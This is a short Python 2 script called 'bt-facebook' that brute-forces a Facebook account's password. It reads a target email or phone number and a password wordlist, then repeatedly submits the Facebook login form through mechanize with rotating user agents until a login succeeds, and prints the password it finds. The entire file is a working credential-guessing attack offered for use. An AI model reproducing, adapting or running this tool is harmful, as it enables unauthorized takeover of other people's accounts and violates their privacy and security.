#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random
import os

r="\033[0;31m"
g="\033[0;32m"
c="\033[0;36m"
y="\033[1;33m"
w="\033[0m"




email = str(raw_input("username (or) email (or) phone number "+r+"? "+w))

passwordlist = str(raw_input("enter the wordlist name and path "+r+"? "+w))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist "+r+"[!]")

	
	
def brute(password):
	sys.stdout.write("\r Trying "+g+">"+w+" {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n"+g+"[+]"+w+" password find = {}".format(password))
			raw_input("any key to exit....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
def welcome():
	total = open(passwordlist,"r")
	total = total.readlines()
	os.system("figlet bt-facebook") 
	print("      by 4n.alejo")
	print
	print("account to crack"+g+" {}".format(email)+w)
	print
        #print("loaded " , len(total), "passwords")
	#print("cracking, please wait ...\n\n")

	
if __name__ == '__main__':
	main()
